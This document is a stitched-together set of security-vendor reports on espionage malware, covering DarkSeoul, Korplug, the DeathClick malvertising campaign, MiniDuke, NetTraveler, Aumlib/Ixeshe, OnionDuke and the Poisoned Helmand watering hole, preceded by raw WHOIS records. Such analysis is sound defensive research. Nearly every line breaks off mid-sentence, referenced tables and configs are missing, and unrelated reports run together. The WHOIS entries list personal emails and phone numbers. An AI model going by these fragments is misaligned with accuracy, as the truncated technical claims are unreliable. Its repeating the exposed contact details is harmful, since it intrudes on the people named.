Registrant Email:urimanager@silibank.com
Registry Admin ID :
Admin Name : Korea 615 Shenyang company
Admin Organization : Korea 615 Shenyang company
Admin Street : shenyang hepingqu xifudalu 615 hao 2 danyuan 6 - 1 - 5
Admin City : shenyangshi
Admin State / Province : liaoningsheng
Admin PostalCode:123456
Admin Country : China
Admin Phone:+86.024 22523102
Admin Phone Ext :
Admin Fax:+86.024 22523102
Admin Fax Ext :
Admin Email:urimanager@silibank.com
Registry Tech ID :
Tech Name : Korea 615 Shenyang company
Tech Organization : Korea 615 Shenyang company
Tech Street : shenyang hepingqu xifudalu 615 hao 2 danyuan 6 - 1 - 5
Tech City : shenyangshi
Tech State / Province : liaoningsheng
Tech PostalCode:123456
Tech Country : China
Tech Phone:+86.024 22523102
Tech Phone Ext :
Tech Fax:+86.024 22523102
Tech Fax Ext :
Tech Email:urimanager@silibank.com
Name Server : ns13.xincache.com
Name Server : ns14.xincache.com
Domain Name : chongryon.com
Registry Domain ID : 69711868_DOMAIN_COM - VRSN
Registrar WHOIS Server : whois.melbourneit.com
Registrar URL : http://www.melbourneit.com.au
Updated Date : 2014 - 03 - 26T00:31:24Z
Creation Date : 2001 - 04 - 20T06:45:46Z
Registrar Registration Expiration Date : 2015 - 04 - 20T06:45:46Z
Registrar : Melbourne IT Ltd
Registrar IANA ID : 13
Registrar Abuse Contact Email : abuse@melbourneit.com.au
Registrar Abuse Contact Phone : + 61.386242300
Domain Status : ok
Registry Registrant ID :
Registrant Name : o guanin
Registrant Organization : o guanin
Registrant Street : " hujimi2 - 14 - 15 , "
Registrant City : chiyodaku
Registrant State / Province : tokyo
Registrant Postal Code : 1028138
Registrant Country : JP
Registrant Phone : + 81.332627111
Registrant Phone Ext :
Registrant Fax :
Registrant Fax Ext :
Registrant Email : park2@mac.com
Registry Admin ID :
Admin Name : guanin o
Admin Organization :
Admin Street : " hujimi2 - 14 - 15 , "
Admin City : chiyodaku
Admin State / Province : tokyo
Admin Postal Code : 1028138
Admin Country : JP
Admin Phone : + 81.332627111
Admin Phone Ext :
Admin Fax :
Admin Fax Ext :
Admin Email : park2@mac.com
Registry Tech ID :
Tech Name : Link Club
Tech Organization : Link Club
Tech Street : 5 - 39 - 6 Jingumae Shibuya - ku
Tech City : TOKYO
Tech State / Province : 150 - 0001
Tech Postal Code : JP
Tech Country : JP
Tech Phone : + 81.462643403
Tech Phone Ext :
Tech Fax :
Tech Fax Ext :
Tech Email : mel-tech@hosting-link.ne.jp
Name Server : USR - NS1.LINKCLUB.JP
Name Server : USR - NS2.LINKCLUB.JP
Domain Information : [ B%I%a%$%s > pJs ]
Appendix B – Sites found on North Korean IP space
Appendix C – Analysis of DarkSeoul Dropper
Dropper
Also known as / detected as :
The dropper component that we examined was distributed as a UPX - packed binary .
Installation
When executed it creates the following files in the affected user ’s % Temp% directory :
Size : 166,912 bytes
Size : 153,600 bytes
Size : 1,186 bytes
Also known as / detected as :
Trojan : SH / Kofornix . A ( Microsoft )
Trojan . Jokra ( Symantec )
Size : 24,576
Payload — attempts to connect to remote servers and upload a destructive bash script
After determining the location of user profile directories on the affected computer , the malware
If an mRemote installation is located , the dropper reads the configuration file and checks if there ’s
If a SecureCRT installation is located , the dropper extracts information from sessions that have
Username = root , Protocol = SSH and a saved password . If these conditions are satisfied , the
After extracting these connection and server details , the dropper uses the previously dropped alg .
The bash script initially checks which UNIX it is running on ( of HP - UX , SunOS , Linux , or AIX ) and
Win32 Wiper component
When the AgentBase.exe component is executed , it first attempts to stop the following processes ,
It then enumerates all physical drives and overwrites the first 512 bytes with the string :
It continues to look for removable and fixed drives , locates the root directory on these drives , and
Finally , the affected computer is shut down and rebooted , although if the wiping mechanisms
Learn more at
Korplug military targeted attacks : Afghanistan & Tajikistan
After taking a look at recent Korplug ( PlugX ) detections , we identified two larger scale campaigns
Afghanistan & Tajikistan . The other campaign , where the targets were a number of high - profile
Sometimes malware used in various attacks is unique enough to identify related incidents , which makes
In other cases , attackers use more common tools for accomplishing their criminal goals . For example , the
Korplug RAT ( a.k.a .PlugX ) is a well - known toolkit associated with Chinese APT groups and used in a
Among these , we were able to discover several successful infections where the employed Korplug samples
Updated Date : 2013 - 11 - 12 18:03:45
Create Date : 2013 - 06 - 18 11:08:17
Registrant Name : lee stan
Registrant Organization : lee stan
Registrant Street : xianggangdiqu
Registrant City : xianggangdiqu
Registrant State : xianggang
Registrant Postal Code : 796373
Registrant Country : HK
Registrant Phone : + 0.04375094543
Registrant Fax : + 0.04375094543
Registrant Email:stanlee@gmail.com
Other Korplug samples were connecting to a different domain name resolving to the same IPs as
Updated Date : 2013 - 11 - 12 18:05:33
Create Date : 2013 - 09 - 10 14:35:11
Registrant Name : z x
Registrant Organization : z x
Registrant Street : xianggangdiqu
Registrant City : xianggangdiqu
Registrant State : xianggang
Registrant Postal Code : 123456
Registrant Country : HK
Registrant Phone : + 0.0126324313
Registrant Fax : + 0.0126324313
Registrant Email : 123@123.com
Updated Date : 2014 - 10 - 16 14:16:27
Create Date : 2014 - 10 - 16 14:16:27
Registrant Name : gang xin
Registrant Organization : gang xin
Registrant Street : Argentina Argentina
Registrant City : Argentina
Registrant State : Argentina
Registrant Postal Code : 647902
Registrant Country : AR
Registrant Phone : + 54.0899567089
Registrant Fax : + 54.0899567089
Registrant Email : woffg89@yahoo.com
Taking these C&Cs as a starting point , we were able to locate a number of victims infected through various
A table with a selection of RTF documents and RAR self - extracting archives with a .SCR extension is
English
File name                                                         SHA1
Situation Report about
План деятельности                Activity plan for
Telephone directory
О Центре социальной              About the Center for
Meeting minutes of
Протокол встречи НГШ
Situation Report about
Military and political
Afghan Air Force.scr                                   E32081C56F39EA14DFD1E449C28219D264D80B2F
Some of the above - mentioned files also contained decoy documents :
In all of the cases , three binary files were dropped ( apart from decoy documents ) that led to the Korplug
The Korplug RAT is known to use this side - loading trick by abusing legitimate digitally signed executables
The maliciously crafted documents are RTF files that successfully exploit the CVE-2012 - 0158 vulnerability
Interestingly , though , the documents also contain the newer CVE-2014 - 1761 exploit that was extensively
Sednit , MiniDuke , and others ) . However , this exploit is not implemented correctly due to a wrong file
Below we see the disassembly of the 1st stage shellcode where it checks the presence of the tag “ p!11 ”
Sophos’ Gabor Szappanos gives a possible explanation how these malformed samples may have come into
June 2014 and continue through today .
We were able to pinpoint the targets to residents of the following countries :
Afghanistan
Tajikistan
Russia
Kyrgyzstan
Kazakhstan
From the topics of the files used to spread the malware , as well as from the affected targets , it appears that
Interestingly , most of the affected victims have another thing in common – a number of other RATs , file
Since the functionality of these tools was partly overlapping with that of Korplug , it left us wondering
Additional information about two malware families that were most often found accompanying Korplug
Alternative Malware # 1 : DarkStRat
A curious Remote Access Trojan , as research points to a Chinese connection but the commands it listens
The malware can manage processes and services on the infected machine , transfer files to and from the
C&C server , run shell commands , and so on . It is written in Delphi and connects to
Alternative Malware # 2 : File Stealer
This malware , written in C , and contains several functions for harvesting files off the victim ’s hard drive
In addition to collecting files , the malware attempts to gather saved passwords , history of visited URLs ,
Microsoft Messenger
Microsoft Outlook
Microsoft Internet Explorer
Mozilla Firefox
The C&C domains used by this malware are :
Some samples of this file stealer detected in these campaigns also contain the signature by “ Nanning
List of SHA1 hashes :
Korplug :
Alternative Malware # 1 :
Alternative Malware # 2 :
Research by : Anton Cherepanov
Author Robert Lipovsky , ESET
Invincea White Paper
Release date : October 27 , 2014
Invincea White Paper
Invincea , Inc.
Invincea White Paper                1
Table of Contents
Executive Summary ............................................................................................................... 2
Introduction .......................................................................................................................... 3
Operation DeathClick : Targeting the US Industrial Base ................................................................... 4
Summary for Incident at Fleaflicker.com ......................................................................................... 4
Summary for Incident at Gpokr.com ............................................................................................... 9
Summary for Webmail.earthlink.net ............................................................................................. 11
Summary of Incidents in Operation DeathClick ............................................................................. 13
Real - Time Bidding Networks : How it works .......................................................................... 13
Malvertisers have Weaponized RTB ............................................................................................. 16
Competitive Service Offerings for RTB .......................................................................................... 16
Major Players in RTB .................................................................................................................... 20
How Malvertisers Get $ $ to Bid on RTB ......................................................................................... 21
Where Malvertisers Host Exploits ................................................................................................. 22
Real World Examples of RTB Malvertising Captured by Invincea .................................................... 23
Ransomware Campaign via Malvertising ............................................................................. 26
Analysis of CryptoWall Malvertising Infections .............................................................................. 27
Central Hosting of Clean Content ......................................................................................... 30
How to Protect Yourself from Micro - targeted Malvertising ................................................. 31
Release Notes ...................................................................................................................... 32
Invincea , Inc.                                                                                     Release Date : 10.27.2014
Invincea White Paper        2
Executive Summary
Most targeted attacks against organizations originate as spear - phish campaigns or watering hole style
Traditional malvertizing has been an effective but indiscriminate method cyber crime gangs use to
Intellectual Property more than ad fraud and indicates motive and sophistication characteristic of
While we discovered these attacks across multiple Defense companies , we expect it will not be long , if
Invincea , Inc.                                                              Release Date : 10.27.2014
Invincea White Paper        3
Introduction
Malvertising has seen meteoric rise in 2014 . Threat actors create a corporate front , advertise on
These exploit kits are hosted on compromised web servers across the world . In other words , they leverage
In the campaign described here , Operation DeathClick , traditional malvertising has been armed with a
The threat actors redirect their ads for just minutes at a time and then abandon their exploit kit pages
Ad delivery networks today are not incentivized to address the problem in a credible manner as they
Without cooperation of ad networks to vet the advertisers working through front companies , this attack
Invincea , Inc.                                                            Release Date : 10.27.2014
Invincea White Paper        4
Real - time ad bidding allows advertisers , and by extension , adversaries , to micro - target ad delivery on an
Today , it is commonplace for micro - targeting techniques to be used as part of the toolset in legitimate
Now advanced threat actors are able to target an organization directly via micro - targeted malvertising ,
Operation DeathClick : Targeting the US Industrial Base
Recently , multiple US Defense / Aerospace contractors were targeted by a malvertising campaign . These
But in a two week period , these organizations were hit with dozens of micro - targeted malvertising attacks ,
Next we go in some detail about example attacks perpetrated against the defense firms .
It is important to note that the websites we show next that served up targeted malvertising were victims
Summary for Incident at Fleaflicker.com
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper        5
A user visited his online fantasy football league homepage at Fleaflicker.com . As soon as the page loaded ,
Figure 1 shows a screenshot of the page that was visited . You will notice the two inline ad placements
Figure 1 : Fleaflicker.com website
Note the prominent ad placements by AdChoice , a DoubleClick affiliate . Figure 2 shows an event tree of
Invincea , Inc.                                                            Release Date : 10.27.2014
Invincea White Paper        6
Figure 2 : Event tree for infection from Fleaflicker.com Incident
The event tree in Figure 2 taken from Invincea ’s Threat Management Console shows the exploited Java
Figure 3 : Timeline for Fleaflicker.com Incident
Note the number of re - directs from Fleaflicker.com to different outside properties in Figure 3 .
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper        7
Figure 4 : Process Launch for Malware fvJcrgR0.exe from Fleaflicker.com Incident
Invincea Threat Management provides a quick way to search for an MD5 hash on third party sites ( see
Figure 4 ) . By clicking the VirusTotal link , the analyst will see the following VirusTotal report in Figure 5 :
Figure 5 : VirusTotal Report for Malware fvJcrgR0.exe from Fleaflicker.com Incident
Invincea , Inc.                                                              Release Date : 10.27.2014
Invincea White Paper        8
From the VirusTotal report in Figure 5 , you will see that this malware is a Trojan backdoor that would likely
Invincea , Inc.                                                              Release Date : 10.27.2014
Invincea White Paper        9
Summary for Incident at Gpokr.com
An employee at a defense contractor visited a free Texas Poker online game . The Poker site had
Figure 6 : Screenshot of Gpokr.com
It should be noted that Gpokr.com no longer appears to be serving advertisements from their site . At the
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper        10
Figure 7 : Event Tree for Gpokr.com
This event on September 14 ( Figure 8) shows that delivery.first-impression.com redirected directly to an
Figure 8 : Timeline View for Event 5 – Gpokr.com
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper        11
Summary for Webmail.earthlink.net
In another incident an employee checked their online Earthlink account . When they replied to an email ,
Figure 9 : Screenshot of Webmail.earthlink.net
You will notice the inline advertisements on this page in Figure 9 . The event tree in Figure 10 notes that
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper     12
Figure 10 : Event Tree for Incident 6 Webmail.earthlink.net
Note in the timeline in Figure 11 , how there was a 7 minute gap between the DoubleClick ad redirect and
Figure 11 : Timeline for Incident 6 Webmail.earthlink.net
Invincea , Inc.                                                          Release Date : 10.27.2014
Invincea White Paper        13
Summary of Incidents in Operation DeathClick
The three examples above are samples of the more than two dozen micro - targeted attacks we have
Real - Time Bidding Networks : How it works
We observed in Operation DeathClick that real - time ad bidding networks are being used by criminal
Real - time ad bidding networks have evolved over the last ten years as a means of micro - targeting
From Wikipedia :
Real - time bidding ( RTB ) refers to the means by which ad inventory is bought and sold on a per-
Real - time bidding is a dynamic bidding process where each impression is bid for in ( near ) real time ,
A typical transaction begins with a user visiting a website . This triggers a bid request that can
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper        14
The bidding happens autonomously and advertisers set maximum bids and budgets for an
The following infographic summarizes how advanced adversaries are now micro - targeting companies
Invincea , Inc.                                                            Release Date : 10.27.2014
Invincea White Paper    15
Invincea , Inc.    Release Date : 10.27.2014
Invincea White Paper         16
Malvertisers have Weaponized RTB
The marketplace and auction of ads sounds great for actual ads . But what if the landing pages that are
A malicious advertiser on a network may serve crafted , seemingly normal ads , a majority of the time . In
Silverlight , or all three . Once the malvertiser detects that he has several infected hosts , he removes the
This allows the malicious advertiser to perform hit and run attacks , infect whomever he wants at whatever
In the sections below , we will provide highlights of the RTB industry , its targeting capabilities , and show
Competitive Service Offerings for RTB
The RTB ad networks provide significant micro - targeting capabilities that have long been used to serve
Real Time Bidding service providers linked . Emphasis added by Invincea .
Pubmatic :
Audience Targeting : Bid on the audiences most valuable to you . Each impression in the PubMatic
Buyers have access to proprietary audience segments either directly through Private Marketplace
Invincea , Inc.                                                               Release Date : 10.27.2014
Invincea White Paper        17
With PubMatic , buyers are able to access pre - defined vertical or audience packages , seasonal
First - Impression.com
Could Malvertisers Track Exploits and their cost per impression ? Yes . Many RTB networks provide a
Below is a URL redirection log from First - Impression.com from a winning bid by a malvertiser . In the URL
To showcase the variety of impression - level data available to buyers , consider the data made
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper         18
Just like when considering one type of data , by using the anonymous cookie parameter , buyers
Twitter , Facebook and other RTB ads can now target mobile devices by their phone
This sounds like a great way to advertise if you are in the marketing industry . Consider how granularly a
Twitter ’s Tailored Audiences just got a little more tailored .
Advertisers can now augment their customer data using mobile advertising IDs and mobile
Twitter also rolled out the ability to target lookalike audiences , a function that seems pretty similar
Twitter described its enhanced as “ part of improved targeting options to help advertisers reach
Tailored Audiences , Twitter ’s seeming answer to the Facebook Exchange ( FBX ) , officially launched
Neustar does provide a real - time bidding ad exchange , but their real market is IP intelligence that they
In a blog post below , Neustar boasts about their direct to IP range and enterprise advertising .
Invincea , Inc.                                                               Release Date : 10.27.2014
Invincea White Paper        19
How can Neustar IP Intelligence target by IP ?
While IP intelligence has been around for many years , the ability to effectively target advertising
This has only been possible with the recent emergence of real time bidding ( RTB ) . The secret
Is an IP Address like a cookie ?
No , an IP address only identifies devices on a network . The IP address does not contain any PII and
Product Specific Questions
Q1 : How does the process work ?
The process works exactly like any advertising network . Instead of buying inventory based on a
Neustar offers a full service ad network . Brand marketers who wish to advertise using IP Audience
Targeting can work directly with Neustar to determine custom IP placements , run campaigns ,
Neustar manages the entire process .
How does Neustar deliver its ads ?
We use industry standard methods for delivering our ads , but what makes our approach special is
Zedo
Zedo , blamed for recent malvertising via DoubleClick , say they are now trying to protect against
Device Targeting
Users can now target ads to a specific device when trafficking ads . An option for “ Device
Targeting ” is now available under “ Targeting ” . A creative targeted to a specific Device will serve
Invincea , Inc.                                                              Release Date : 10.27.2014
Invincea White Paper       20
Figure 13 : Targeting by Device Manufacturer / Model
Apart from device , a user can target various devices based on different categories . At any given
Figure 14 : Targeting by Device Category
Reach Report by Creative
Apart from existing campaign reach report a user can now pull a reach report by creative . The
Major Players in RTB
Invincea , Inc.                                                          Release Date : 10.27.2014
Invincea White Paper         21
To be clear , RTB networks are legitimate platforms for displaying ads on ad - supported websites . They
Below are links to RTB providers to learn more .
How Malvertisers Get $ $ to Bid on RTB
Invincea has shown logs from a winning malvertising bid in the price range of 65 cents per impression .
That is one ad , on one page , paid for by the malvertiser ’s account . This implies that malvertisers have
Invincea recently saw a malvertiser win a bid and delivered a Java exploit . This exploit copied a fully
It is ironic , however , that click fraud is what is driving the prices of RTB advertising so high . Malvertising
Figure 14 below shows a log file of Chrome , in this instance , renamed Oajvliewxpge.exe , injected via Java
Invincea , Inc.                                                               Release Date : 10.27.2014
Invincea White Paper        22
Figure 16 : Event tree of click fraud malvertising exploit
It should be noted that Invincea is uniquely capable of stopping this type of attack . The introduction of
Chrome as a browser , which is whitelisted by hash across the AV industry , would go unchecked by the AV
But the malware delivery could have been intended for data exfiltration , banking Trojans , or any other
Where Malvertisers Host Exploits
The ability for advertisers and malvertisers to automatically redirect to self - hosted ad content or exploit
Invincea , Inc.                                                              Release Date : 10.27.2014
Invincea White Paper        23
In most instances , the landing pages are preconfigured with the exploit kit . The malvertiser creates the
Real World Examples of RTB Malvertising Captured by Invincea
Figures 17 through 21 in the following are screenshots from Invincea ’s Threat Management console from
Figure 17 : Recent Blaze . Com RTB Kryptik malvertising via GumGum
Figure 18 : Online Ammunition Forum had RTB malvertising delivered . Exploit landing page in
Invincea , Inc.                                                              Release Date : 10.27.2014
Invincea White Paper    24
Figure 19 : Largest Trading Online Forum Trade2Win.com delivered RTB malvertising via
German provider :
Figure 20 : Answers.com click bait articles hosted winning RTB bids dropping Kryptik from
Polish government landing page exploit kits .
Invincea , Inc.                                                   Release Date : 10.27.2014
Invincea White Paper    25
Figure 21 : Online Poker Room and targeted RTB attack against Defense Contractor . Java
Invincea , Inc.                                                 Release Date : 10.27.2014
Invincea White Paper        26
Ransomware Campaign via Malvertising
In September and October of 2014 , Invincea saw a sharp spike of malvertising delivering CryptoWall
Ransomware is a particularly pernicious form of malware that fully encrypts the victim ’s disk and data
To learn more about the scourage of ransomware , see this blog .
Based on analysis of Invincea logs in would - be victims targeted by these ads , we have insight into the
This campaign matches the characteristics described by Proofpoint in its blog in terms of the exploitation
Cryptowall 2.0 utilizes the TOR network to hide its communications , but it quickly encrypts all local files
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper     27
Analysis of CryptoWall Malvertising Infections
Mitigated Infection Event Sports . Yahoo.com
Below is a typical Cryptowall 2 infection as seen in the Invincea Management Server logs . This winning
Analysis ( Original report ) :
Figure 22 : CryptoWall 2.0 infection report
Invincea , Inc.                                                           Release Date : 10.27.2014
Invincea White Paper     28
Timeline Analysis ( Original Report ) :
Below in Figure 23 is the timeline of the Tor connections and SSL connections employed by CryptoWall .
Figure 23 : Network connections from CryptoWall 2.0
Invincea , Inc.                                                          Release Date : 10.27.2014
Invincea White Paper      29
In addition , you can see the ransom note being written to disk on an infected machine in the audit logs
Figure 24 : File writes including the ransom note from CryptoWall infection
Figure 25 shows the winning malvertising bid via RTB ad delivery from first-impression.com . Items
Figure 25 : Winning malvertising bid with fields embedded in URL
Invincea , Inc.                                                            Release Date : 10.27.2014
Invincea White Paper        30
In Figure 26 below , we show the unique identifiers for the userID and campaigns to deliver CryptoWall
Figure 26 : Malware campaigns delivered via 3rd party ad network and the websites that hosted the
To reiterate , neither the websites listed here , nor the 3rd party ad network , necessarily was aware of the
In each event above , Invincea blocked an attempt to infect an endpoint with Cryptowall 2.0 and
Central Hosting of Clean Content
Most RTB ad providers allow for advertisers to host their own ad content . This allows advertisers to
Invincea , Inc.                                                              Release Date : 10.27.2014
Invincea White Paper        31
It is this weakness in security that malvertisers are taking advantage of . If ad networks were to switch to
The RubiconProject has a Seller ’s Cloud , which could be a security model for the RTB industry . It is
How to Protect Yourself from Micro - targeted Malvertising
Operation DeathClick is an active campaign to micro - target companies via malvertising in order to
Web proxy blocking updates , even in real time , will not stop new malvertising landing pages that appear
Intelligence feeds from the premier intelligence providers , based on hostname , IP , URL or domain will not
Invincea protected users can simply browse and click anything online without fear of compromise or
Non - Invincea users can attempt to OptOut of directed targeting where you can . European privacy laws
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper        32
Note , that opting out merely places a blocking cookie in your browser . This means that ad providers will
Release Notes
Invincea , Inc.                                                            Release Date : 10.27.2014
Miniduke still duking it out
At the end of April Microsoft announced that a vulnerability in Word was actively being exploited . This
C&C server via Twitter .
The RTF exploit document
The exploit document was named Proposal - Cover - Sheet - English.rtf and is quite bland when compared to
April 8th , only three days after the compilation of the MiniDuke payload , dated April 5th in the PE header .
The payload remains quite small at only 24 KB .
The functionality of the shellcode which is executed by triggering the vulnerability is rather simple and
An interesting thing about the shellcode is that before transferring control to any API function it checks
The next graph presents the execution flow of this malware when the exploitation is successful . As
Execution flow of MiniDuke
Main Component
Installation
Once MiniDuke receives control it checks that the host process is not rundll32.exe and whether the
Once the encrypted version of the malware is created , it is written into a file in the
The filename extension is also picked randomly from the following list :
To persist on the infected system after reboots , the malware creates a hidden .LNK file in the “ Startup ”
The .LNKfile is created using a COM object with the IShellLinkA interface and contains the following
Operation
When the malware is loaded by rundll32.exe and the current directory is n’t % TEMP% , the malware starts
If any of these are found in the system the configuration information will be decrypted incorrectly , i.e. the
As the next step , MiniDuke gathers the following information from the infected systems :
Internet proxy configuration
This information is then sent to the C&C server along with the request to download a payload . The final
An example of such a URL is given below :
The payload is downloaded in the file named “ fdbywu ” using the urlmon!URLDownloadToFileA API :
The downloaded payload is a fake GIF8 file containing encrypted executable . The malware processes the
Twitter Generation Algorithm
In the event that MiniDuke is unable to retrieve a C&C URL from this account , it generates a username to
The TwitterJS module is extracted by creating a copy of the Windows DLL cryptdll.dll , injecting a block of
This file is then stored in an Alternate Data Stream ( ADS ) in NTUSER.DAT in the % USERPROFILE%
When loaded , TwitterJS instantiates the JScript COM object and decrypts a JScript file containing the
Prior to executing it , MiniDuke applies a light encoding to the script : The next images show the result of
Result of first obfuscation
Result of second obfuscation
The purpose of this script is to use Twitter to find a C&C and retrieve JScript code to execute . It first
The first link on the retrieved page should contain base64 data ; the name attribute of the link is used as a
The tale of the broken SHA-1
The code hashing algorithm used by the component looks very much like SHA-1 but outputs different
By examining how this 2nd word was generated we finally discovered that this was caused by a scope
A likely explanation of how this problem came to be is
Twitter DGA accounts
We generated the list of Twitter search terms for 2013 - 2014 and checked if any of those were registered .
At the moment only one exists , @AA2ADcAOAA , which is the TwitterJS account that was generated
Belgium , France and the UK . We have contacted national CERTs to notify the affected parties . We detect
Appendix A : SHA-1 hashes
Appendix B & C : DGA algorithms , Twitter DGA accounts
The DGA scripts and account lists have been moved to our Github account :
Author ESET Research , ESET
We have written about NetTraveler before HERE and HERE .
Earlier this year , we observed an uptick in the number of attacks against Uyghur and Tibetan supporters
Here 's an example of a targeted spear - phishing e - mail directed at Uyghur activists in March 2014 .
The e - mail has two attachments , a non - malicious JPG file and a 373 KB Microsoft Word .DOC file .
File name
Size                       381,667 bytes
The .DOC file , which in reality is a " Single File Web Page " container , also known as " Web archive file " ,
It contains an exploit for the CVE-2012 - 0158 vulnerability , detected by Kaspersky Lab products as
Exploit . MSWord . CVE-2012 - 0158.db .
If run on a vulnerable version of Microsoft Office , it drops the main module as " net.exe " ( detected by
Kaspersky Lab products as Trojan - Dropper . Win32.Agent.lifr ) , which in turn installs a number of
Spy . Win32.TravNet.qfr ) .
Name                       WINDOWSUPDATANEY.DLL
Size                       37,888 bytes
It is registered as a service ( named " Windowsupdata " ) through a Windows Batch file named " DOT.BAT "
Windowsupdata
Windowsupdata /f
Windowsupdata      /f                                                                        /v
Windowsupdata      /f                                                                        /v Start /t
To    make sure the malware is n't running multiple times , it uses the mutex " SD_2013 Is Running ! " to mark
Hunter-2012 Is Running !
The malware configuration file is written to the " SYSTEM " folder ( as opposed to SYSTEM32 ) and has a
For the record , here 's what an older NetTraveler config file looks like :
Obviously , the developers behind NetTraveler have taken steps to try to hide the malware 's configuration .
Luckily , the encryption is relatively simple to break .
The algorithm is as follows :
Once decrypted , the new config looks like this :
One can easily see the command - and - control ( C&C ) server in the screenshot above , which is
We identified several samples using this new encryption scheme . A list of all the extracted C&C servers can
C&C server             IP                    IP location                       Registrar
Hong Kong , Albert Heng ,           SHANGHAI MEICHENG
Trillion Company                  TECHNOLOGY
United States , Los Angeles ,       TODAYNIC.COM
Integen Inc                       INC .
Hong Kong , Kowloon ,
Datacenter
Hong Kong , Sun Network            SHANGHAI MEICHENG
We recommend blocking all these hosts in your firewall .
Conclusion
This year , the actors behind NetTraveler celebrate 10 years of activity . Although the earliest samples we
For 10 years NetTraveler has been targeting various sectors , with a focus on diplomatic , government and
Most recently , the main focus of interest for cyber - espionage activities revolved around space exploration ,
The targeting of Uyghur and Tibetan activists remains a standard component of their activities and we can
Survival of the Fittest : New York Times Attackers Evolve Quickly
The attackers behind the breach of the New York Times’ computer network late last year appear to be
The new campaigns mark the first significant stirrings from the group since it went silent in January in the
The newest campaign uses updated versions of Aumlib and Ixeshe .
Aumlib , which for years has been used in targeted attacks , now encodes certain HTTP communications .
And a new version of Ixeshe , which has been in service since 2009 to attack targets in East Asia , uses new
The updates are significant for both of the longstanding malware families ; before this year , Aumlib had
Cybercriminals are constantly evolving and adapting in their attempts to bypass computer network
As long as these actors regularly achieve their objective ( stealing sensitive data ) , they are not motivated to
Attackers do not change their approach unless an external force or environmental shift compels them to .
As the old saying goes : If it ai n’t broke , do n’t fix it .
So when a larger , successful threat actor changes up tactics , the move always piques our attention .
Naturally , our first priority is ensuring that we detect the new or altered TTPs . But we also attempt to
We observed an example of this phenomenon around May. About four months after The New York Times
Backdoor . APT.Aumlib and Backdoor . APT.Ixeshe malware families [ 2 ] .
The previous versions of Aumlib had not changed since at least May 2011 , and Ixeshe had not evolved
We can not say for sure whether the attackers were responding to the scrutiny they received in the wake of
The following sections detail the changes to Backdoor . APT.Aumlib and Backdoor . APT.Ixeshe .
Backdoor . APT.Aumlib
Aumlib has been used in targeted attacks for years . Older variants of this malware family generated the
Data sent via this POST request transmitted in clear text in the following structure :
A recently observed malware sample ( hash value 832f5e01be536da71d5b3f7e41938cfb ) appears to be a
The sample , which was deployed against an organization involved in shaping economic policy , was
The sample generated the following traffic :
This output reveals the following changes when compared with earlier variants :
The POST URI is changed to /bbs / search.asp ( as mentioned , earlier Aumlib variants used a POST
The POST body is now encoded .
Additional requests from the sample generated the following traffic :
These subtle changes may be enough to circumvent existing IDS signatures designed to detect older
The sample 832f5e01be536da71d5b3f7e41938cfb shares code with an older Aumlib variant with the hash
Backdoor . APT.Ixeshe
Ixeshe has been used in targeted attacks since 2009 , often against entities in East Asia [ 3 ] . Although the
We analyzed a recent sample that appears to have targeted entities in Taiwan , a target consistent with
This sample ( aa873ed803ca800ce92a39d9a683c644 ) exhibited network traffic that does not match the
The Base64-encoded data still contains information including the victim ’s hostname and IP address but
Based on our observations , the most successful threat actors evolve slowly and deliberately . So when they
Notes
This entry was posted in Threat Intelligence , Threat Research by Ned Moran and Nart Villeneuve .
Bookmark the permalink .
News from the Lab
Recently , research was published identifying a Tor exit node , located in Russia , that was consistently and
When a user attempts to download an executable via the malicious Tor exit node , what they actually
A flowchart of the infection process
Once executed , the DLL file ( SHA1 : b491c14d8cfb48636f6095b7b16555e9a575d57f , detected as
Backdoor : W32/OnionDuke . B ) will decrypt an embedded configuration ( shown below ) and attempt to
A screenshot of the embedded configuration data
Through our research , we have also been able to identify multiple other components of the OnionDuke
One component , however , is an interesting exception . This DLL file ( SHA1
Within a two - week window , " John Kasai " also registered the following domains : airtravelabroad.com ,
This is significant because the domains leveldelta.com and grouptumbler.com have previously been
A visualization of the infrastructure shared between OnionDuke and MiniDuke
Based on compilation timestamps and discovery dates of samples we have observed , we believe the
We also have evidence suggesting that , at least since February of 2014 , OnionDuke has not only been
During our research , we have also uncovered strong evidence suggesting that OnionDuke has been used in
In any case , although much is still shrouded in mystery and speculation , one thing is certain . While using
Tor may help you stay anonymous , it does at the same time paint a huge target on your back . It 's never a
Samples :
Detected as : Trojan - Dropper : W32/OnionDuke . A , Backdoor : W32/OnionDuke . A , and
Backdoor : W32/OnionDuke . B.
Post by — Artturi ( @lehtior2 )
Operation Poisoned Helmand
In this day and age of interconnected cloud services and distributed content delivery networks ( CDNs ) , it
Afghan Government “ Watering Hole ”
The ThreatConnect Intelligence Research Team ( TCIRT ) recently observed a targeted cross - site scripting
Java applet via nearly all of the major official Government of Afghanistan websites . The compromised
The domain cdn.afghanistan[.]af is a legitimate CDN site used by the Afghan Ministry of Communications
The javascript URL ( [ http:]//cdn.afghanistan[.]af / scripts / gop - script.js ) is called from numerous official
Afghan Government websites , including the following :
It is likely that this javascript URL itself is normally legitimate , but the attackers obtained access to the file
Note that the gov.af websites would not need to be compromised individually for this attack to be
Li Keqiang : A Harbinger of Targeted Exploitation ?
Judging by the last modified timestamp on the HTTP response of gop-script.js , which is Tue , 16 Dec 2014
Officer of Afghanistan in Astana Kazakhstan , they would discuss infrastructure development and bilateral
Looking at the EXIF metadata of the image of Keqiang meeting with Abdullah that is hosted on the
Chinese embassy website we note a Tue , 16 December 2014 07:43:31 modify time as well as the
Abdullah was likely taken and edited sometime prior to 07:43:31 . While it is ambiguous as to which
If we assume the photograph and afternoon meeting took place sometime prior to 13:43 Alma - Ata
It is worth mentioning that a similar scenario occurred on June 20th when security researcher
Chinese delegation led by Keqiang was visiting Greek Prime Minister Antonis Samaras in Athens . Security
While these two separate events are not directly related , additional research into the status of ministerial
Java Malware Overlap
Upon closer inspection of the prepended malicious JavaScript code , one will notice the similarity in the
While the 403 Forbidden errors may seem like an analytic dead end , the TCIRT also identified a malicious
Java applet submission to VirusTotal that confirms the nature of this malicious activity . This Java applet ,
Affairs site , which was also affected by the gop - script XSS .
